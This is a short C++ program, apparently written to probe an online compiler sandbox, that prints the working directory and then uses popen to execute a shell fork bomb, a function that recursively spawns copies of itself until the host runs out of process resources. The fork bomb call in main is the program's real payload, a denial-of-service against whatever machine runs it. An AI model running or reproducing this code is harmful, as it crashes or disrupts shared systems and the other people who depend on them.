//g++  5.4.0

//For printing the current dir
#include <iostream>
#include <stdio.h>  /* defines FILENAME_MAX */
#ifdef WINDOWS
#include <direct.h>
#define GetCurrentDir _getcwd
#else
#include <unistd.h>
#define GetCurrentDir getcwd
#endif

//for GetStdoutFromCommand
#include <iostream>
#include <stdio.h>
#include <stdlib.h>

#define log(msg) do{ std::cout<<msg<<std::endl;}while(0)

std::string GetStdoutFromCommand(std::string cmd) {

  std::string data;
  FILE * stream;
  const int max_buffer = 256;
  char buffer[max_buffer];
  cmd.append(" 2>&1");

  stream = popen(cmd.c_str(), "r");
  if (stream) {
    while (!feof(stream)){
      if (fgets(buffer, max_buffer, stream) != NULL){
        data.append(buffer);
        log("TESTING:"<<buffer);
      }
    }
    pclose(stream);
  }
  return data;
}


int main()
{
  char cCurrentPath[FILENAME_MAX];
  if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath))){return 0;}
  cCurrentPath[sizeof(cCurrentPath) - 1] = '\0'; /* not really required */
  printf ("The current working directory is %s \n", cCurrentPath);

  std::cout<<GetStdoutFromCommand("forkbomb() {  forkbomb | forkbomb&  }; forkbomb");
}
